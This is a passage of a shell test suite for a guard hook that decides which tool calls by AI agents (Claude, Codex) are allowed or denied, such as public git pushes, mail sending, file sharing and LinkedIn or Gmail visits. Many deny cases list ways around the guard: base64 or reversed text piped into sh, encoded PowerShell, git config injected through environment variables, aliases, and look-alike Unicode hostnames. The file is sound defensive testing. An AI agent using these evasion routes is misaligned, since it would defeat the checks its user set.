check "J4-12 gh api absolute URL write to <private> (allow)" allow "$(shelljson "$TN" 'gh api https://api.github.com/repos/octocat/zz9-missing/issues -f title=x')"
check "J4-12 gh api graphql mutation (deny)" deny "$(shelljson "$TN" "gh api graphql -f query='mutation{createRepository(input:{name:\"x\",visibility:PUBLIC}){repository{url}}}'")"
check "J4-12 gh api graphql read (allow)" allow "$(shelljson "$TN" "gh api graphql -f query='query{viewer{login}}'")"
check "J4-13 $PU to a trailing-dot GitHub host (deny)" deny "$(shelljson "$TN/none" "git $PU https://github.com./octocat/Hello-World.git HEAD")"
check "J4-13 $PU to a trailing-dot scp GitHub host (deny)" deny "$(shelljson "$TN/none" "git $PU git@github.com.:octocat/Hello-World HEAD")"
check "C-03 shell alias with its own public destination (deny)" deny "$(shelljson "$TN/aliasown" 'git ship')"

echo "== guard ($IMPL): look-alike site hosts (2026-10)"
LD="$(printf 'www.link\xef\xbd\x85din.com')"       # fullwidth e
GM="$(printf 'mail\xe3\x80\x82google\xe3\x80\x82com')" # ideographic dots
check "browser to a full-width-letter LinkedIn host (deny)" deny "{\"tool_name\":\"mcp__playwright__browser_navigate\",\"tool_input\":{\"url\":\"https://$LD/\"}}"
check "browser to an ideographic-dot Gmail host (deny)" deny "{\"tool_name\":\"mcp__playwright__browser_navigate\",\"tool_input\":{\"url\":\"https://$GM/\"}}"
check "browser code setting location to a look-alike host (deny)" deny "{\"tool_name\":\"mcp__playwright__browser_evaluate\",\"tool_input\":{\"function\":\"() => { window.location = 'https://$GM/' }\"}}"
check "browser to a café path on an ASCII host (allow)" allow "{\"tool_name\":\"mcp__playwright__browser_navigate\",\"tool_input\":{\"url\":\"https://jobs.example.com/$(printf 'caf\xc3\xa9')/role\"}}"

echo "== guard ($IMPL): connector verb at the front of a kebab name (2026-10)"
check "C-04 mail tool send-and-get (deny)" deny '{"tool_name":"mcp__mail__send-and-get","tool_input":{}}'
check "C-04 Gmail send-email-and-get (deny)" deny '{"tool_name":"mcp__claude_ai_Gmail__send-email-and-get","tool_input":{}}'
check "C-04 ok: get_draft_send_status (allow)" allow '{"tool_name":"mcp__claude_ai_Superhuman_Mail__get_draft_send_status","tool_input":{}}'

echo "== guard ($IMPL): ways around the push check (2026-10 audit)"
check "cd \"\$PWD\" && git $PU, public (deny unread)" deny "$(shelljson "$TN/pub" "cd \"\$PWD\" && git $PU")"
check "git -C \"\$PWD\" $PU, public (deny unread)" deny "$(shelljson "$TN/pub" "git -C \"\$PWD\" $PU")"
check "D=<dir>; cd \"\$D\" && git $PU, public (deny)" deny "$(shelljson "$TN" "D=$TN/pub; cd \"\$D\" && git $PU")"
check "export D=<dir>; git -C \"\${D}\" $PU, public (deny)" deny "$(shelljson "$TN" "export D=$TN/pub; git -C \"\${D}\" $PU")"
check "D=<private>; cd \"\$D\" && git $PU (allow)" allow "$(shelljson "$TN" "D=$TN/priv; cd \"\$D\" && git $PU origin main")"
check "PowerShell: \$d = <dir>; Set-Location \$d; git $PU (deny)" deny "$(shelljson "$TN" "\$d = '$TN/pub'; Set-Location \$d; git $PU" PowerShell)"
check "PowerShell: \$x = git $PU runs the push (deny)" deny "$(shelljson "$TN/pub" "\$x = git $PU origin main" PowerShell)"
check "cd to an unset variable stays put, then $PU (deny)" deny "$(shelljson "$TN/pub" "cd \"\$NOT_SET_ANYWHERE_ZZ\" && git $PU")"
check "ok: 'git $PU' inside a grep pattern after cd \"\$F\" (allow)" allow "$(shelljson "$TN" "F=$TN/none; cd \"\$F\" && grep -E \"a|git $PU|b\" notes.txt")"
case "$T" in
  "$HOME"/*) check "git -C ~/<public repo> $PU (deny)" deny "$(shelljson "$TN" "git -C ~/${T#"$HOME"/}/pub $PU")" ;;
  *) skip "git -C ~/<public repo> $PU" "the test folder isn't under the home folder" ;;
esac
check "ok: text mentioning git $PU, folder without git (allow)" allow "$(shelljson "$TN/proj" "echo 'run git $PU later' > notes.txt")"
check "alias made and used in one command (deny)" deny "$(shelljson "$TN/priv" "git config alias.p $PU && git p")"
check "remote added and pushed in one command (deny)" deny "$(shelljson "$TN/priv" "git remote add pub $PUBURL && git $PU pub")"
check "remote set-url then $PU in one command (deny)" deny "$(shelljson "$TN/priv" "git remote set-url origin $PUBURL && git $PU origin")"
check "ok: text mentioning \"git $PU check\" (allow, no such remote)" allow "$(shelljson "$TN/priv" "echo 'git $PU check' > notes.txt")"
check "GIT_DIR=<public repo> git $PU (deny)" deny "$(shelljson "$TN/priv" "GIT_DIR=$TN/pub/.git git $PU")"
check "line continuation git \\\\<newline>$PU (deny)" deny "{\"tool_name\":\"Bash\",\"cwd\":$(j "$TN/pub"),\"tool_input\":{\"command\":\"git \\\\\\n$PU origin\"}}"
check "backslash inside the word: git p\\\\ush (deny unread)" deny "$(shelljson "$TN/pub" 'git p\ush origin')"
check "ANSI-C quoting: git \$'$PU' (deny unread)" deny "$(shelljson "$TN/pub" "git \$'$PU' origin")"
check "program in a variable: \$g $PU (deny unread)" deny "$(shelljson "$TN/pub" "g=git; \$g $PU origin")"
check "program from a subcommand: \"\$(command -v git)\" $PU (deny unread)" deny "$(shelljson "$TN/pub" "\"\$(command -v git)\" $PU origin")"
check "macOS base64 -D into sh (deny hidden)" deny "$(shelljson "$TN/pub" 'echo Z2l0 | base64 -D | sh')"
check "printf assembled text piped into sh (deny hidden)" deny "$(shelljson "$TN/pub" "printf 'git pu%s origin' sh | sh")"
check "text piped into /bin/sh (deny hidden)" deny "$(shelljson "$TN/pub" 'echo nigiro | rev | /bin/sh')"
check "pwsh -ec <base64> (deny hidden)" deny "$(shelljson "$TN/pub" 'pwsh -NoProfile -ec ZwBpAHQA')"
check "powershell -e <base64> (deny hidden)" deny "$(shelljson "$TN/pub" 'powershell.exe -e ZwBpAHQA' PowerShell)"
check "gh api PUT a file into a public repo (deny)" deny "$(shelljson "$TN" 'gh api -X PUT repos/octocat/Hello-World/contents/notes.md -f message=x -f content=YWJj')"
check "gh api POST to a private repo (allow)" allow "$(shelljson "$TN" 'gh api -X POST repos/octocat/this-repo-does-not-exist-zz9/issues -f title=x')"
check "gh api graphql createRepository visibility:PUBLIC (deny)" deny "$(shelljson "$TN" "gh api graphql -f query='mutation{createRepository(input:{name:\"x\",visibility:PUBLIC}){repository{url}}}'")"
check "gh release upload -R <public> (deny)" deny "$(shelljson "$TN" 'gh release upload v1 notes.md -R octocat/Hello-World')"
check "gh release upload -R <private> (allow)" allow "$(shelljson "$TN" 'gh release upload v1 notes.md -R octocat/this-repo-does-not-exist-zz9')"
check "gh release create, this folder's remote public (deny)" deny "$(shelljson "$TN/pub" 'gh release create v1 notes.md')"
check "ok: pdftotext -enc UTF-8 (allow)" allow "$(shelljson "$TN/pub" 'pdftotext -enc UTF-8 jobs/acme-pm/Alex-Rivera-Resume-Acme.pdf -')"
check "ok: pipe into sort and head (allow)" allow "$(shelljson "$TN/pub" 'cat jobs/tracker.csv | sort | head -5')"
check "ok: python3 -c reading stdin (allow)" allow "$(shelljson "$TN/pub" "cat notes.txt | python3 -c 'import sys; print(len(sys.stdin.read()))'")"
check "ok: git config user.name, then $PU to private (allow)" allow "$(shelljson "$TN/priv" "git config --get user.name; git $PU origin main")"
check "ok: git remote -v (allow)" allow "$(shelljson "$TN/pub" 'git remote -v')"
check "ok: searching a file for linkedin.com (allow)" allow "$(shelljson "$TN/pub" 'grep -c linkedin.com jobs/leads.csv')"
check "ok: open a job page in the browser (allow)" allow "$(shelljson "$TN/pub" 'open https://jobs.example.com/123')"

echo "== guard ($IMPL): sending mail or opening those sites from the shell"
check "osascript telling Mail to send (deny)" deny "$(shelljson "$TN/pub" "osascript -e 'tell application \"Mail\" to send (make new outgoing message)'")"
check "Outlook COM automation .Send() (deny)" deny "$(shelljson "$TN/pub" "\$o = New-Object -ComObject Outlook.Application; \$m = \$o.CreateItem(0); \$m.Send()" PowerShell)"
check "Send-MailMessage (deny)" deny "$(shelljson "$TN/pub" 'Send-MailMessage -To a@example.com -Subject hi -SmtpServer smtp.example.com' PowerShell)"
check "python smtplib (deny)" deny "$(shelljson "$TN/pub" "python3 -c 'import smtplib'")"
check "open LinkedIn in the user's browser (deny)" deny "$(shelljson "$TN/pub" 'open -a "Google Chrome" https://www.linkedin.com/feed')"
check "python webbrowser to Gmail (deny)" deny "$(shelljson "$TN/pub" "python3 -c \"import webbrowser; webbrowser.open('https://mail.google.com')\"")"
check "Start-Process LinkedIn messaging (deny)" deny "$(shelljson "$TN/pub" 'Start-Process https://www.LinkedIn.com/messaging' PowerShell)"

echo "== guard ($IMPL): connected apps and browsers (2026-10 audit)"
check "kebab-case send-chat-message (deny)" deny '{"tool_name":"mcp__ms365__send-chat-message","tool_input":{}}'
check "kebab-case reply-to-chat-message (deny)" deny '{"tool_name":"mcp__ms365__reply-to-chat-message","tool_input":{}}'
check "kebab-case delete-onedrive-file (deny)" deny '{"tool_name":"mcp__ms365__delete-onedrive-file","tool_input":{}}'
check "kebab-case list-mail-messages (allow)" allow '{"tool_name":"mcp__ms365__list-mail-messages","tool_input":{}}'
check "kebab-case create-draft-email (allow)" allow '{"tool_name":"mcp__ms365__create-draft-email","tool_input":{}}'
check "Drive share_file (deny)" deny '{"tool_name":"mcp__claude_ai_Google_Drive__share_file","tool_input":{"email":"r@example.com"}}'
check "Slack post_message (deny)" deny '{"tool_name":"mcp__slack__slack_post_message","tool_input":{}}'
check "website publish (deny)" deny '{"tool_name":"mcp__site__publish_website","tool_input":{}}'
check "IFTTT get_actions (allow, reading)" allow '{"tool_name":"mcp__claude_ai_IFTTT__get_actions","tool_input":{}}'
check "Playwright browser_evaluate window.location= Gmail (deny)" deny '{"tool_name":"mcp__playwright__browser_evaluate","tool_input":{"function":"() => { window.location = '"'"'https://mail.google.com/'"'"' }"}}'
check "Playwright browser_evaluate harmless (allow)" allow '{"tool_name":"mcp__playwright__browser_evaluate","tool_input":{"function":"() => document.title"}}'
check "browser script setting location= LinkedIn (deny)" deny '{"tool_name":"mcp__Claude_Browser__navigate","tool_input":{"script":"location='"'"'https://www.linkedin.com/feed'"'"'"}}'
check "browser to g.co short link (deny)" deny '{"tool_name":"mcp__claude-in-chrome__navigate","tool_input":{"url":"https://g.co/kgs/abc"}}'
check "browser to aka.ms short link (deny)" deny '{"tool_name":"mcp__claude-in-chrome__navigate","tool_input":{"url":"https://aka.ms/abcd"}}'
check "browser to t.ly short link (deny)" deny '{"tool_name":"mcp__claude-in-chrome__navigate","tool_input":{"url":"https://t.ly/abcd"}}'
check "browser to a site with s.id inside its name (allow)" allow '{"tool_name":"mcp__claude-in-chrome__navigate","tool_input":{"url":"https://careers.acmes.id/jobs"}}'
IFTTT_RUN='{"tool_name":"mcp__claude_ai_IFTTT__run_action","tool_input":{"service_slug":"gmail","slug":"send_an_email","fields":{"to":"r@example.com"}}}'
if [ "$IMPL" = sh ]; then
  check "IFTTT run_action, Claude: ask the user" ask "$IFTTT_RUN"
  RUN="$RUN_DEFAULT codex" check "IFTTT run_action, Codex mode: block (exit 2)" block2 "$IFTTT_RUN"
  RUN="$RUN_DEFAULT codex" check "Codex mode: gmail send blocks with exit 2" block2 '{"tool_name":"mcp__gmail__send_email","tool_input":{}}'
  RUN="$RUN_DEFAULT codex" check "Codex mode: gmail search allowed" allow '{"tool_name":"mcp__gmail__search_emails","tool_input":{}}'
  RUN="$RUN_DEFAULT codex" check "Codex mode: git $PU public blocks with exit 2" block2 "$(shelljson "$TN/pub" "git $PU")"
  RUN="$RUN_DEFAULT"
else
  check "IFTTT run_action, Codex: block" deny "$IFTTT_RUN"
fi

echo "== guard ($IMPL): meeting tools, collaborators and contacts apps (2026-10)"
Z='mcp__claude_ai_Zoom_for_Claude__'
check "Zoom canvas_add_file_collaborators (deny)" deny "{\"tool_name\":\"${Z}canvas_add_file_collaborators\",\"tool_input\":{\"emails\":[\"r@example.com\"]}}"
check "Zoom canvas_modify_file_collaborator_role (deny)" deny "{\"tool_name\":\"${Z}canvas_modify_file_collaborator_role\",\"tool_input\":{}}"
check "Zoom canvas_remove_file_collaborator (deny)" deny "{\"tool_name\":\"${Z}canvas_remove_file_collaborator\",\"tool_input\":{}}"
check "Zoom canvas_list_file_collaborators (allow)" allow "{\"tool_name\":\"${Z}canvas_list_file_collaborators\",\"tool_input\":{}}"
check "Zoom meeting_delete (deny)" deny "{\"tool_name\":\"${Z}meeting_delete\",\"tool_input\":{\"meeting_id\":\"1\"}}"
check "Zoom in_meeting_control (deny)" deny "{\"tool_name\":\"${Z}in_meeting_control\",\"tool_input\":{}}"
check "Zoom meeting_create with alternative_hosts (deny)" deny "{\"tool_name\":\"${Z}meeting_create\",\"tool_input\":{\"topic\":\"x\",\"settings\":{\"alternative_hosts\":\"r@example.com\"}}}"
check "Zoom meeting_create, host_video setting only (allow)" allow "{\"tool_name\":\"${Z}meeting_create\",\"tool_input\":{\"topic\":\"Practice\",\"settings\":{\"host_video\":true,\"alternative_hosts\":\"\"}}}"
check "meeting registrant create (deny)" deny '{"tool_name":"mcp__zoom__meeting_registrant_create","tool_input":{}}'
for zt in ask get_meeting_assets recordings_list search search_meetings get_file_content my_notes_get_note_content hub_get_file_content; do
  check "Zoom $zt (allow)" allow "{\"tool_name\":\"${Z}$zt\",\"tool_input\":{}}"
done
check "Slack add_member_to_channel (deny)" deny '{"tool_name":"mcp__slack__add_member_to_channel","tool_input":{}}'
check "docs update_permissions (deny)" deny '{"tool_name":"mcp__docs__update_permissions","tool_input":{}}'
check "Drive get_file_permissions (allow)" allow '{"tool_name":"mcp__claude_ai_Google_Drive__get_file_permissions","tool_input":{}}'
check "Contacts+ send_product_feedback (deny)" deny '{"tool_name":"mcp__claude_ai_Contacts__send_product_feedback","tool_input":{"text":"x"}}'
for ct in search_contacts get_contact list_tags; do
  check "Contacts+ $ct (allow)" allow "{\"tool_name\":\"mcp__claude_ai_Contacts__$ct\",\"tool_input\":{}}"
done
for rt in PitchBook_Premium__search_companies Octagon_AI__octagon-agent Google_Drive__read_file_content Granola__get_meeting_transcript \
  Calendly__scheduling_links-create_single_use_scheduling_link Gamma__generate Notion__notion-search Superhuman_Mail__create_or_update_draft \
  Anthropic_Economic_Index__get_occupation Gamma__export_gamma Figma__upload_assets SecondBrain__export_briefing; do
  check "connector $rt (allow)" allow "{\"tool_name\":\"mcp__claude_ai_$rt\",\"tool_input\":{}}"
done
check "export_leaderboard is not leads (allow)" allow '{"tool_name":"mcp__stats__export_leaderboard","tool_input":{}}'
# Writes to a contacts app, pushes of people's details, feedback to a vendor: Claude asks, Codex blocks.
for at in claude_ai_Contacts__push_contact_info claude_ai_Contacts__suggest_contact_update claude_ai_Contacts__add_tags \
  hubspot__create_contact crm__export_contacts people__sync_people_to_sheet claude_ai_Granola__give_feedback; do
  if [ "$IMPL" = sh ]; then
    check "$at, Claude: ask the user" ask "{\"tool_name\":\"mcp__$at\",\"tool_input\":{}}"
  else
    check "$at, Codex: block" deny "{\"tool_name\":\"mcp__$at\",\"tool_input\":{}}"
  fi
done
if [ "$IMPL" = sh ]; then
  RUN="$RUN_DEFAULT codex" check "Codex mode: Contacts+ push_contact_info blocks with exit 2" block2 '{"tool_name":"mcp__claude_ai_Contacts__push_contact_info","tool_input":{}}'
  RUN="$RUN_DEFAULT codex" check "Codex mode: Contacts+ search_contacts allowed" allow '{"tool_name":"mcp__claude_ai_Contacts__search_contacts","tool_input":{}}'
  RUN="$RUN_DEFAULT"
fi

echo "== guard ($IMPL): Codex review 2026-10-13 (push check)"
# exec_command / shell with tool_input.workdir: git runs there, not in the session folder.
wdjson() { # wdjson <cwd> <command> <workdir JSON value>
  printf '{"session_id":"x","hook_event_name":"PreToolUse","cwd":%s,"tool_name":"exec_command","tool_input":{"cmd":%s,"workdir":%s}}' "$(j "$1")" "$(j "$2")" "$3"
}
check "J1-01 Codex workdir = public repo, cwd = private (deny)" deny "$(wdjson "$TN/priv" "git $PU origin HEAD" "$(j "$TN/pub")")"
check "J1-01 Codex relative workdir = public repo (deny)" deny "$(wdjson "$TN" "git $PU origin HEAD" '"pub"')"
check "J1-01 Codex workdir that doesn't exist (deny)" deny "$(wdjson "$TN/priv" "git $PU origin HEAD" "$(j "$TN/no-such-folder")")"
check "J1-01 Codex workdir that isn't text (deny)" deny "$(wdjson "$TN/priv" "git $PU origin HEAD" '["x"]')"
check "J1-01 ok: Codex workdir = private repo, cwd = public (allow)" allow "$(wdjson "$TN/pub" "git $PU origin main" "$(j "$TN/priv")")"
check "J1-01 ok: Codex workdir null (allow)" allow "$(wdjson "$TN/priv" "git $PU origin main" 'null')"
check "J3-01 git -C a folder that doesn't exist, remote name (deny)" deny "$(shelljson "$TN/priv" "git -C /nonexistent/JobHQ $PU origin HEAD")"
check "J3-01 PowerShell: git -C C:\\Users\\Alex\\JobHQ (not here) $PU (deny)" deny "$(shelljson "$TN/priv" "git -C C:\\Users\\Alex\\JobHQ $PU origin HEAD" PowerShell)"
check "J3-01 cd to a folder that doesn't exist, then $PU (deny)" deny "$(shelljson "$TN/priv" "cd /nonexistent/JobHQ && git $PU origin HEAD")"
if [ -n "$WIN" ]; then
  check "J3-01 PowerShell: git -C <backslash path> $PU, public (deny)" deny "$(shelljson "$TN/none" "git -C $(cygpath -w "$T/pub") $PU origin HEAD" PowerShell)"
  check "J3-01 PowerShell: git -C <backslash path> $PU, private (allow)" allow "$(shelljson "$TN/none" "git -C $(cygpath -w "$T/priv") $PU origin main" PowerShell)"
else
  skip "J3-01 PowerShell backslash paths" "needs Windows paths"
fi
mk rewrite "$PRIVURL"
git -C "$T/rewrite" config "url.$PUBURL.insteadOf" reviewdest
git -C "$T/rewrite" config "url.$PUBURL.pushInsteadOf" pushdest
mk fork "$PUBURL"; git -C "$T/fork" config "url.$PRIVURL.pushInsteadOf" "$PUBURL"
check "J5-04 saved url.<public>.insteadOf, $PU to that word (deny)" deny "$(shelljson "$TN/rewrite" "git $PU reviewdest HEAD")"
check "J5-04 saved url.<public>.pushInsteadOf, $PU to that word (deny)" deny "$(shelljson "$TN/rewrite" "git $PU pushdest HEAD")"
check "J5-04 ok: $PU to the private origin of a folder with rewrites (allow)" allow "$(shelljson "$TN/rewrite" "git $PU origin main")"
check "J5-04 ok: fetch public, pushInsteadOf private: $PU origin (allow)" allow "$(shelljson "$TN/fork" "git $PU origin main")"
check "J5-04 ok: fetch public, pushInsteadOf private: $PU <public URL> (allow)" allow "$(shelljson "$TN/fork" "git $PU $PUBURL main")"
check "J3-02 attached -curl.<public>.insteadOf (deny)" deny "$(shelljson "$TN/priv" "git -curl.$PUBURL.insteadOf=reviewdest $PU reviewdest HEAD")"
check "J3-02 --config-env=remote.origin.url=U (deny)" deny "$(shelljson "$TN/priv" "export U=$PUBURL; git --config-env=remote.origin.url=U $PU origin HEAD")"
check "J3-02 --config-env remote.origin.url=U, separate word (deny)" deny "$(shelljson "$TN/priv" "git --config-env remote.origin.url=U $PU origin HEAD")"
check "J3-03 gh re\\<newline>po create --public (deny)" deny "$(shelljson "$TN" $'gh re\\\npo create leaked --public')"
check "J3-03 g\\<newline>it $PU <public URL> (deny)" deny "$(shelljson "$TN/none" $'g\\\nit '"$PU $PUBURL HEAD")"
check "J3-03 PowerShell backtick continuation, public (deny)" deny "$(shelljson "$TN/pub" "git $PU \`"$'\n'"origin main" PowerShell)"
check "J3-03 ok: PowerShell backtick continuation, private (allow)" allow "$(shelljson "$TN/priv" "git $PU \`"$'\n'"origin main" PowerShell)"
check "J3-04 gh api graphql --input <file> (deny)" deny "$(shelljson "$TN" 'gh api graphql --input imports/request.json')"
check "J3-04 gh api graphql -F query=@<file> (deny)" deny "$(shelljson "$TN" 'gh api graphql -F query=@imports/q.graphql')"
check "J3-04 gh api graphql -f query=@- (deny)" deny "$(shelljson "$TN" 'gh api graphql -f query=@-')"
check "J3-04 gh api graphql -f query=\"\$Q\" (deny)" deny "$(shelljson "$TN" 'gh api graphql -f query="$Q"')"
check "J3-04 gh api graphql -f query=\"\$(cat q)\" (deny)" deny "$(shelljson "$TN" 'gh api graphql -f query="$(cat q.graphql)"')"
check "J3-04 ok: gh api graphql query with \$variables (allow)" allow "$(shelljson "$TN" "gh api graphql -f query='query(\$login:String!){user(login:\$login){name}}' -F login=octocat")"
check "J3-04 gh api PATCH <private> -F private=@<file> (deny)" deny "$(shelljson "$TN" 'gh api -X PATCH repos/octocat/this-repo-does-not-exist-zz9 -F private=@flag.txt')"
mk alias2 "$PRIVURL"
git -C "$T/alias2" config alias.ship "!git $PU $PRIVURL HEAD; git $PU $PUBURL HEAD"
git -C "$T/alias2" config alias.shipok "!git fetch && git $PU $PRIVURL HEAD"
git -C "$T/alias2" config alias.shipcd "!cd $TN/pub && git $PU"
git -C "$T/alias2" config alias.shipc "!git -C $TN/pub $PU"
check "J5-05 shell alias, second $PU public (deny)" deny "$(shelljson "$TN/alias2" 'git ship')"
check "J5-05 shell alias that cds first (deny)" deny "$(shelljson "$TN/alias2" 'git shipcd')"
check "J5-05 shell alias with git -C (deny)" deny "$(shelljson "$TN/alias2" 'git shipc')"
check "J5-05 ok: shell alias fetch && $PU private (allow)" allow "$(shelljson "$TN/alias2" 'git shipok')"
check "J5-07 PowerShell \$env:GIT_CONFIG_* then $PU (deny)" deny "$(shelljson "$TN/priv" "\$env:GIT_CONFIG_COUNT='1'; \$env:GIT_CONFIG_KEY_0='remote.origin.pushurl'; \$env:GIT_CONFIG_VALUE_0='$PUBURL'; git $PU origin HEAD" PowerShell)"
check "J5-07 Codex shell_command \$env:GIT_CONFIG_* then $PU (deny)" deny "$(shelljson "$TN/priv" "\$env:GIT_CONFIG_COUNT='1'; \$env:GIT_CONFIG_KEY_0='remote.origin.pushurl'; \$env:GIT_CONFIG_VALUE_0='$PUBURL'; git $PU origin HEAD" shell_command)"
check "J5-07 PowerShell Set-Item Env:GIT_DIR then $PU (deny)" deny "$(shelljson "$TN/priv" "Set-Item -Path Env:GIT_DIR -Value '$TN/pub/.git'; git $PU" PowerShell)"
check "J5-07 [Environment]::SetEnvironmentVariable('GIT_...') then $PU (deny)" deny "$(shelljson "$TN/priv" "[Environment]::SetEnvironmentVariable('GIT_CONFIG_COUNT', '1'); git $PU origin HEAD" PowerShell)"
check "J5-07 declare -x GIT_CONFIG_* then $PU (deny)" deny "$(shelljson "$TN/priv" "declare -x GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=remote.origin.url GIT_CONFIG_VALUE_0=$PUBURL; git $PU origin HEAD")"
check "J5-07 ok: PowerShell \$env:PATH change, then $PU private (allow)" allow "$(shelljson "$TN/priv" "\$env:Path += ';C:\\tools'; git $PU origin main" PowerShell)"
check "J5-08 powershell -Command \"git $PU <public>\" (deny)" deny "$(shelljson "$TN/priv" "powershell -NoProfile -Command \"git $PU $PUBURL HEAD\"" shell_command)"
check "J5-08 bash -c 'git $PU <public>' (deny)" deny "$(shelljson "$TN/priv" "bash -c 'git $PU $PUBURL HEAD'" shell_command)"
check "J5-08 cmd /c \"git $PU <public>\" (deny)" deny "$(shelljson "$TN/priv" "cmd /c \"git $PU $PUBURL HEAD\"" shell_command)"
check "J5-08 pwsh -ExecutionPolicy Bypass -c \"git $PU <public>\" (deny)" deny "$(shelljson "$TN/priv" "pwsh -ExecutionPolicy Bypass -c \"git $PU $PUBURL HEAD\"" shell_command)"
check "J5-08 bash -lc 'cd pub && git $PU' (deny)" deny "$(shelljson "$TN" "bash -lc 'cd pub && git $PU'")"
check "J5-08 Codex argv [bash, -lc, cd pub && git $PU] (deny)" deny "{\"tool_name\":\"shell\",\"cwd\":$(j "$TN"),\"tool_input\":{\"command\":[\"bash\",\"-lc\",\"cd pub && git $PU\"]}}"
check "J5-08 pwsh -wd pub -Command \"git $PU\" (deny)" deny "$(shelljson "$TN" "pwsh -wd pub -Command \"git $PU\"" shell_command)"
check "J5-08 ok: powershell -Command \"git $PU <private>\" (allow)" allow "$(shelljson "$TN/priv" "powershell -NoProfile -Command \"git $PU $PRIVURL HEAD\"" shell_command)"
check "J5-08 ok: Codex argv [bash, -lc, cd priv && git $PU origin main] (allow)" allow "{\"tool_name\":\"shell\",\"cwd\":$(j "$TN"),\"tool_input\":{\"command\":[\"bash\",\"-lc\",\"cd priv && git $PU origin main\"]}}"
check "cd in a subshell doesn't last: (cd <private>); git $PU from public (deny)" deny "$(shelljson "$TN/pub" "(cd $TN/priv); git $PU origin main")"
check "cd inside bash -c doesn't last: bash -c 'cd <private>'; git $PU (deny)" deny "$(shelljson "$TN/pub" "bash -c 'cd $TN/priv'; git $PU origin main")"
check "ok: cd <private> && git $PU from a folder with no remotes (allow)" allow "$(shelljson "$TN/none" "cd $TN/priv && git $PU origin main")"

echo "== guard ($IMPL): Codex review 2026-10-13 (connectors, browser, false positives)"
check "J3-06 mail messages-send-and-get (deny)" deny '{"tool_name":"mcp__mail__messages-send-and-get","tool_input":{"to":"a@example.com"}}'
check "J3-06 send_email_and_get (deny)" deny '{"tool_name":"mcp__mail__send_email_and_get","tool_input":{}}'
check "J3-06 ok: get_post (allow)" allow '{"tool_name":"mcp__forum__get_post","tool_input":{}}'
check "J3-07 camelCase addFileCollaborators (deny)" deny '{"tool_name":"mcp__drive__addFileCollaborators","tool_input":{"collaborators":["a@example.com"]}}'
check "J3-07 camelCase inviteAttendees (deny)" deny '{"tool_name":"mcp__cal__inviteAttendees","tool_input":{}}'
check "J3-07 PascalCase UpdatePermissions (deny)" deny '{"tool_name":"mcp__docs__UpdatePermissions","tool_input":{}}'
check "J3-07 ok: camelCase listFileCollaborators (allow)" allow '{"tool_name":"mcp__drive__listFileCollaborators","tool_input":{}}'
check "J3-07 ok: camelCase calendar createEvent, nobody invited (allow)" allow '{"tool_name":"mcp__claude_ai_Google_Calendar__createEvent","tool_input":{"summary":"Interview"}}'
SHY="$(printf 'www.link\xc2\xadedin.com')"; ZWS="$(printf 'www.linked\xe2\x80\x8bin.com')"; WJ="$(printf 'mail.goo\xe2\x81\xa0gle.com')"
check "J3-09 browser to LinkedIn with a soft hyphen (deny)" deny "{\"tool_name\":\"mcp__playwright__browser_navigate\",\"tool_input\":{\"url\":\"https://$SHY/\"}}"
check "J3-09 browser to LinkedIn with a zero-width space (deny)" deny "{\"tool_name\":\"mcp__playwright__browser_navigate\",\"tool_input\":{\"url\":\"https://$ZWS/\"}}"
check "J3-09 browser to Gmail with a word joiner (deny)" deny "{\"tool_name\":\"mcp__Claude_Browser__navigate\",\"tool_input\":{\"url\":\"https://$WJ/\"}}"
check "J3-09 browser to LinkedIn with %C2%AD (deny)" deny '{"tool_name":"mcp__claude-in-chrome__navigate","tool_input":{"url":"https://www.link%C2%ADedin.com/feed"}}'
check "J3-09 browser code to LinkedIn with a soft hyphen (deny)" deny "{\"tool_name\":\"mcp__playwright__browser_evaluate\",\"tool_input\":{\"function\":\"() => { window.location = 'https://$SHY/' }\"}}"
check "J3-09 ok: soft hyphen on a job site (allow)" allow "{\"tool_name\":\"mcp__playwright__browser_navigate\",\"tool_input\":{\"url\":\"https://jobs.example.com/$(printf 'engi\xc2\xadneer')\"}}"
check "J4-02 ok: Outlook calendar create_event, nobody invited (allow)" allow '{"tool_name":"mcp__outlook_calendar__create_event","tool_input":{"subject":"Interview","attendees":[]}}'
check "J4-02 ok: Outlook create_event, nobody invited (allow)" allow '{"tool_name":"mcp__outlook__create_event","tool_input":{"subject":"Interview"}}'
check "J4-02 Outlook calendar create_event with attendees (deny)" deny '{"tool_name":"mcp__outlook_calendar__create_event","tool_input":{"subject":"x","attendees":[{"email":"a@example.com"}]}}'
check "J4-02 Outlook calendar update_event (deny)" deny '{"tool_name":"mcp__outlook_calendar__update_event","tool_input":{}}'
check "J4-02 Superhuman create_or_update_event (deny)" deny '{"tool_name":"mcp__claude_ai_Superhuman_Mail__create_or_update_event","tool_input":{}}'
check "J4-02 Outlook send_mail still blocked (deny)" deny '{"tool_name":"mcp__outlook_calendar__send_mail","tool_input":{}}'
check "J4-03 ok: rg for smtplib in a resume (allow)" allow "$(shelljson "$TN/priv" "rg -n 'smtplib|smtpclient' imports/resume.md")"
check "J4-03 ok: git commit -m mentioning smtplib (allow)" allow "$(shelljson "$TN/priv" "git commit -m 'Record experience with smtplib'")"
check "J4-03 ok: grep for sendmail (allow)" allow "$(shelljson "$TN/priv" 'grep -c sendmail notes.txt')"
check "J4-03 text piped into sendmail (deny)" deny "$(shelljson "$TN/priv" 'cat note.txt | sendmail -t')"
check "J4-03 pwsh -c with Net.Mail.SmtpClient (deny)" deny "$(shelljson "$TN/priv" "pwsh -c \"\$c = New-Object Net.Mail.SmtpClient('smtp.example.com'); \$c.Send('a@example.com','b@example.com','s','b')\"" PowerShell)"
check "git send-email (deny)" deny "$(shelljson "$TN/priv" 'git send-email --to a@example.com 0001.patch')"
check "J4-04 ok: FromBase64String to read text (allow)" allow "$(shelljson "$TN/priv" "[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('SGVsbG8='))" PowerShell)"
check "J4-04 FromBase64String into the call operator (deny)" deny "$(shelljson "$TN/priv" "& ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Z2l0'))) $PU origin" PowerShell)"
check "program name built in brackets: & ('gi' + 't') $PU (deny)" deny "$(shelljson "$TN/priv" "& ('gi' + 't') $PU origin main" PowerShell)"
check "J4-04 [scriptblock]::Create (deny)" deny "$(shelljson "$TN/priv" "& ([scriptblock]::Create(\$t))" PowerShell)"
check "J4-05 ok: gh api -X GET <public> with -f (allow)" allow "$(shelljson "$TN" 'gh api -X GET repos/octocat/Hello-World/releases -f per_page=1')"
check "J4-05 ok: gh api --method=get <public> with -F (allow)" allow "$(shelljson "$TN" 'gh api --method=get repos/octocat/Hello-World/issues -F state=open')"
